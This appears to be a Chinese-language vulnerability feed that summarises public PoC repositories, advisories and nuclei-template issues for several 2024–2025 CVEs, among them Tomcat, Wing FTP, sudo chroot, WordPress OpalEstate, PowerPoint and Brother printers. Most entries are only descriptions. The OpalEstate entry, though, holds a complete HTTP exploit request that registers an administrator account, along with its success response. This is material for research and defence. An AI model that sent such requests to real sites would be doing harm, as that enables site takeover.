entry.title: Apache Tomcat Java反序列化漏洞
entry.content:
漏洞信息

漏洞名称： Apache Tomcat Java反序列化漏洞

漏洞编号：

  • CVE： CVE-2025-24813

漏洞类型： 反序列化

漏洞等级： 高危

漏洞描述： CVE-2025-24813是Apache Tomcat中的一个Java反序列化漏洞，允许攻击者通过上传恶意序列化的Java payload作为会话文件，并触发反序列化过程来执行任意代码。此漏洞的利用需要目标servlet可通过PUT请求写入。

产品厂商： Apache

产品名称： Apache Tomcat

来源： https://github.com/yaleman/cve-2025-24813-poc

类型： CVE-2025:github search

仓库文件

  • .gitignore
  • .python-version
  • CLAUDE.md
  • Dockerfile
  • README.md
  • download.sh
  • justfile
  • main.py
  • payload.base64
  • pyproject.toml
  • uv.lock

来源概述

CVE-2025-24813 Apache Tomcat RCE Exploit PoC

This repository contains a proof-of-concept exploit for CVE-2025-24813, a Java
deserialization vulnerability in Apache Tomcat.

Based on
absholi7ly/POC-CVE-2025-24813/.

Prerequisites

  • Docker

Setup

  1. Install dependencies:

  2. Download ysoserial:

Usage

Using Docker (Recommended)

Build and run the exploit in a container:

Direct Execution

Run the exploit directly:

Options
  • --command: Command to execute (default: calc.exe)
  • --ysoserial: Path to ysoserial.jar (default: ./ysoserial-all.jar)
  • --gadget: ysoserial gadget chain (default: CommonsCollections6)
  • --payload_type: Payload type - ysoserial or java (default: ysoserial)
  • --no-ssl-verify: Disable SSL verification
Examples

How it Works

  1. Checks if the target servlet is writable via PUT requests
  2. Generates a malicious serialized Java payload
  3. Uploads the payload as a session file
  4. Triggers deserialization by accessing the session

Disclaimer

This tool is for educational and authorized testing purposes only. Do not use
against systems you do not own or have explicit permission to test.

References

  • https://scrapco.de/blog/analysis-of-cve-2025-24813-apache-tomcat-path-equivalence-rce.html
  • https://nvd.nist.gov/vuln/detail/CVE-2025-24813
  • https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2025-03-14-Testing-CVE-2025-24813.md
entry.summary:
漏洞信息

漏洞名称： Apache Tomcat Java反序列化漏洞

entry.title: Wing FTP Server Lua注入漏洞
entry.content:
漏洞信息

漏洞名称： Wing FTP Server Lua注入漏洞

漏洞编号：

  • CVE： CVE-2025-47812

漏洞类型： 代码注入

漏洞等级： 高危

漏洞描述： 该漏洞利用了Wing FTP Server登录处理器（loginok.html）中的Lua注入漏洞，通过未经过滤的Lua代码执行，允许攻击者执行任意操作系统命令或获取反向shell。此漏洞通过username参数进行利用。

产品厂商： Wing FTP Server

产品名称： Wing FTP Server

来源： https://github.com/0xgh057r3c0n/CVE-2025-47812

类型： CVE-2025:github search

仓库文件

  • .gitignore
  • CVE-2025-47812.py
  • LICENSE
  • README.md

来源概述

CVE-2025-47812 – Wing FTP Server RCE via Lua Injection

Author: 0xgh057r3c0n

🧠 Description

This exploit leverages a Lua injection vulnerability in Wing FTP Server‘s login handler (loginok.html) to execute arbitrary operating system commands or gain a reverse shell. It abuses unsanitized Lua code execution through the username parameter.

📦 Requirements

  • Python 3.6 or higher
  • pip3

Python Packages

Install the required packages with:

🛠️ Installation

🚀 Usage

Run the script:

Options:

  • Option 1: Execute a system command (e.g., whoami, id)
  • Option 2: Launch a reverse shell (multiple payload options included)

💡 Example

⚠️ Legal Disclaimer

This tool is provided for educational and authorized security testing purposes only.
You are responsible for your actions. Use only on systems you own or are authorized to test.

📄 License

This project is licensed under the MIT License. See the LICENSE file for details.

entry.title: Microsoft Outlook 远程代码执行漏洞
entry.content:
漏洞信息

漏洞名称： Microsoft Outlook 远程代码执行漏洞

漏洞编号：

  • CVE： CVE-2024-21413

漏洞类型： 命令执行

漏洞等级： 严重

漏洞描述： Microsoft Outlook 存在一个远程代码执行漏洞，攻击者可以通过构造特殊的Moniker Link来利用此漏洞，导致在受害者系统上执行任意代码。此漏洞被标记为严重级别，影响广泛使用的Microsoft Outlook客户端。

产品厂商： Microsoft

产品名称： Outlook

来源： https://github.com/projectdiscovery/nuclei-templates/issues/12519

类型： projectdiscovery/nuclei-templates:github issues

Shodan Query: NA

Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(-debug) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file.

Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.

You can check the FAQ for the Nuclei Templates Community Rewards Program here.

entry.title: A vulnerability in Cisco Unified Communications Manager (Unified CM) and Cisco Unified
entry.content:
链接： https://github.com/advisories/GHSA-3q7w-9xf2-2f3g

CVSS 评分： 10.0

参考链接：

  • https://nvd.nist.gov/vuln/detail/CVE-2025-20309

  • https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cucm-ssh-m4UBdpE7

  • https://github.com/advisories/GHSA-3q7w-9xf2-2f3g

描述：

A vulnerability in Cisco Unified Communications Manager (Unified CM) and Cisco Unified Communications Manager Session Management Edition (Unified CM SME) could allow an unauthenticated, remote attacker to log in to an affected device using the root account, which has default, static credentials that cannot be changed or deleted.

This vulnerability is due to the presence of static user credentials for the root account that are reserved for use during development. An attacker could exploit this vulnerability by using the account to log in to an affected system. A successful exploit could allow the attacker to log in to the affected system and execute arbitrary commands as the root user.
entry.summary: 链接： https://github.com/advisories/GHSA-3q7w-9xf2-2f3g

entry.title: CVE-2025-32463 POC
entry.content:
漏洞信息

漏洞名称： CVE-2025-32463 POC

漏洞编号：

  • CVE： CVE-2025-32463

漏洞类型： 权限提升

漏洞描述： 该漏洞利用chroot和sudo在解析nsswitch.conf配置值时尝试打开libnss_systemd.so.2的行为，可能导致权限提升。

来源： https://github.com/robbert1978/CVE-2025-32463_POC

类型： CVE-2025:github search

仓库文件

  • .gitignore
  • Makefile
  • evil.c
  • evil.so
  • image-1.png
  • image.png
  • readme.md
  • strace.log

来源概述


Checking nsswitch.conf default values:

After calling chroot, sudo trys to parse the config values at nsswitch.conf to run the command, which leads it to try to open libnss_systemd.so.2.

entry.title: WordPress OpalEstate Plugin 未授权权限提升漏洞
entry.content:
漏洞信息

漏洞名称： WordPress OpalEstate Plugin 未授权权限提升漏洞

漏洞编号：

  • CVE： CVE-2025-6934

漏洞类型： 权限提升

漏洞等级： 严重

漏洞描述： WordPress的OpalEstate插件在其AJAX注册处理程序中存在一个严重漏洞，允许未经认证的用户注册为管理员。问题在于opalestate_register_form AJAX操作中role参数的不安全处理，该操作通过admin-ajax.php公开暴露。攻击者只需提交role=administrator字段即可提升权限，导致网站完全被控制。

产品厂商： WordPress

产品名称： OpalEstate Plugin

来源： https://github.com/MrjHaxcore/CVE-2025-6934

类型： CVE-2025:github search

仓库文件

  • README.md

来源概述

🚨 WordPress OpalEstate Plugin - Unauthenticated Privilege Escalation Vulnerability

🔎 Description

The OpalEstate plugin for WordPress contains a critical vulnerability in its AJAX registration handler, allowing unauthenticated users to register as administrators.

The issue lies in the insecure handling of the role parameter in the opalestate_register_form AJAX action, which is exposed publicly via admin-ajax.php. An attacker with a valid nonce can escalate privileges by simply submitting the role=administrator field, resulting in full site compromise.

CVE ID: CVE-2025-6934
CVSS Score: 9.8 (Critical)
Published: June 30, 2025

📋 Vulnerable Endpoint/ POC

POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Content-Length: 231
sec-ch-ua-platform: “Windows”
Accept-Language: en-US,en;q=0.9
sec-ch-ua: “Chromium”;v=”133”, “Not(A:Brand”;v=”99”
sec-ch-ua-mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: application/json, text/javascript, /; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/wordpress/?page_id=16
Accept-Encoding: gzip, deflate, br
Cookie: wp-settings-time-1=1750938057; wp-settings-1=libraryContent%3Dbrowse; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; kawuda_cookie=1751024383267404614; PHPSESSID=rsbi6r8gs523c35v319f1jf4tt
Connection: keep-alive

username=mrjtest&email=mrjtest%40gmail.com&password=123&password1=123&role=administrator&confirmed_register=on&opalestate-register-nonce=db20fa048c&_wp_http_referer=%2Fwordpress%2F%3Fpage_id%3D16&ajax=1&action=opalestate_register_form

Response

HTTP/1.1 200 OK
Date: Wed, 02 Jul 2025 14:19:23 GMT
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
X-Powered-By: PHP/8.2.12
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0, no-store, private
Pragma: no-cache
Content-Length: 53
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json; charset=UTF-8

{“status”:true,”redirect”:”/wordpress/?page_id=16”}

Impact

Full WordPress site takeover
Unauthenticated admin account creation
Persistent backdoor access
Potential for privilege chaining and plugin/theme exploitation

🛡️ Mitigation
Remove or sanitize the role parameter from user-controlled input.
Force role assignment server-side (e.g., subscriber only).
Use wp_insert_user() or wp_create_user() with locked roles.
Validate user capabilities before processing sensitive actions.
Patch the plugin or disable AJAX registration if not essential.

BY MRJ HAXCORE
entry.summary:
漏洞信息

漏洞名称： WordPress OpalEstate Plugin 未授权权限提升漏洞</

entry.title: Microsoft PowerPoint Use-After-Free 远程代码执行漏洞
entry.content:
漏洞信息

漏洞名称： Microsoft PowerPoint Use-After-Free 远程代码执行漏洞

漏洞编号：

  • CVE： CVE-2025-47175

漏洞类型： 缓冲区溢出

漏洞等级： 高危

漏洞描述： 该漏洞是Microsoft PowerPoint中的一个Use-After-Free (UAF)漏洞，攻击者可以通过诱骗用户打开特制的PPTX文件来执行任意代码。此PoC脚本生成一个恶意的PPTX文件，旨在触发UAF漏洞。在易受攻击的PowerPoint版本中打开生成的文件可能导致任意代码执行。

产品厂商： Microsoft

产品名称： Microsoft PowerPoint

影响版本： Microsoft PowerPoint 2019 and Office 365 versions prior to June 2025 Patch (KB5002689)

来源： https://github.com/mbanyamer/mbanyamer-Microsoft-PowerPoint-Use-After-Free-Remote-Code-Execution-RCE

类型： CVE-2025:github search

仓库文件

  • CVE2025-47175.py
  • LICENSE
  • README.md

来源概述

CVE-2025-47175 - Microsoft PowerPoint Use-After-Free (UAF) Remote Code Execution PoC

Overview

This repository contains a Proof of Concept (PoC) exploit for the CVE-2025-47175 vulnerability found in Microsoft PowerPoint.
The vulnerability is a Use-After-Free (UAF) bug that allows an attacker to execute arbitrary code by tricking a user into opening a specially crafted PPTX file.

Description

  • Vulnerability: Use-After-Free (UAF) in Microsoft PowerPoint
  • CVE ID: CVE-2025-47175
  • Affected Versions: Microsoft PowerPoint 2019 and Office 365 versions prior to June 2025 Patch (KB5002689)
  • Attack Vector: Local — requires victim to open a crafted PPTX file
  • Impact: Remote Code Execution (RCE)

This PoC script generates a malicious PPTX file designed to trigger the UAF vulnerability. Opening the generated file in a vulnerable PowerPoint version may lead to arbitrary code execution.

Usage

Options

OptionDescriptionDefault
-o, --outputOutput PPTX filenameexploit_cve_2025_47175.pptx
-i, --idShape ID (integer)1234
-n, --nameShape Name (string)MaliciousShape
-t, --textTrigger text inside the slideThis content triggers CVE-2025-47175 UAF vulnerability.

Example

Disclaimer

This PoC is for educational and research purposes only. Unauthorized use against systems without explicit permission is illegal. The author is not responsible for any misuse of this code.

Author

Mohammed Idrees Banyamer

  • Instagram: @banyamer_security
  • GitHub: https://github.com/mbanyamer

References

  • Microsoft Security Update Guide
  • Exploit-DB

漏洞信息

漏洞名称： Microsoft PowerPoint Use-After-Free 远程代

entry.title: Brother Printers Authentication Bypass via Default Admin Password Vulnerability
entry.content:
漏洞信息

漏洞名称： Brother Printers Authentication Bypass via Default Admin Password Vulnerability

漏洞编号：

  • CVE： CVE-2024-51978

漏洞类型： 权限绕过

漏洞等级： 严重

漏洞描述： 通过泄露目标设备的序列号，远程攻击者可以生成目标设备的默认管理员密码。目标设备可能通过未经身份验证的HTTP、HTTPS、IPP、SNMP或PJL请求泄露其序列号。

产品厂商： Brother

产品名称： Brother Printers

搜索语法： app=”brother-Printer”

来源： https://github.com/projectdiscovery/nuclei-templates/issues/12517

类型： projectdiscovery/nuclei-templates:github issues

来源概述

Is there an existing template for this?

  • I have searched the existing templates.

Nuclei Template

Relevant dumped responses

Anything else?

The template fails quietly if target web site does not return a CSRF token in its response checked in this snippet:

extractors:  - type: regex    part: body    name: logbox    group: 1    regex:      - 'id="LogBox" name="(.*?)"'    internal: true  - type: regex    part: body    name: csrf    group: 1    regex:      - 'id="CSRFToken" name="CSRFToken" value="(.*?)"'    internal: true

Example output:
[WRN] [CVE-2024-51978] Could not make http request for https://xxx.xx.xx.xx: unresolved variables found: urlencode(csrf)

A website which does not return any token can still be vulnerable. As you can see in the first screenshot, it does not find the vulnerability

When i send CSRFToken value as empty, it does find it

The template should handle both situations. My suggestion is to send two seperate POST requests, one with csrf and one without it:
entry.summary:
漏洞信息

漏洞名称： Brother Printers Authentication Bypass

entry.title: Sudo 本地权限提升漏洞
entry.content:
漏洞信息

漏洞名称： Sudo 本地权限提升漏洞

漏洞编号：

  • CVE： CVE-2025-32463

漏洞类型： 权限提升

漏洞等级： 高危

漏洞描述： Sudo是一个在Unix-like系统上广泛使用的命令行工具，允许授权用户以提升的权限执行命令。Stratascale Cyber Research Unit (CRU)发现了Sudo中的两个本地权限提升漏洞之一，即CVE-2025-32463。该漏洞影响Sudo版本1.9.14至1.9.17，允许未授权的本地用户通过滥用–chroot (-R)选项获得root访问权限，即使用户没有定义sudo规则。此存储库提供了一个Python概念验证(PoC)重新实现了CRU团队开发的原始Bash利用程序，展示了如何通过用户控制的chroot环境中的精心制作的nsswitch.conf文件实现任意代码执行。

产品名称： Sudo

影响版本： 1.9.14 <= version <= 1.9.17

来源： https://github.com/pevinkumar10/CVE-2025-32463

类型： CVE-2025:github search

仓库文件

  • README.md
  • exploit.py

来源概述

📘 Introduction

Sudo is a widely used command-line utility on Unix-like systems that allows permitted users to execute commands with elevated privileges. It plays a critical role in enforcing the principle of least privilege and maintaining a secure audit trail of administrative activities.
The Stratascale Cyber Research Unit (CRU) discovered two local privilege escalation vulnerabilities in Sudo, one of which is CVE-2025-32463. This vulnerability affects Sudo versions 1.9.14 through 1.9.17, and allows unprivileged local users to gain root access by abusing the –chroot (-R) option, even if no sudo rules are defined for the user.
This repository provides a Python proof-of-concept (PoC) reimplementation of the original Bash exploit developed by the CRU team. It demonstrates how to achieve arbitrary code execution as root via a crafted nsswitch.conf file inside a user-controlled chroot environment.
entry.summary:
漏洞信息

漏洞名称： Sudo 本地权限提升漏洞

漏洞编号：
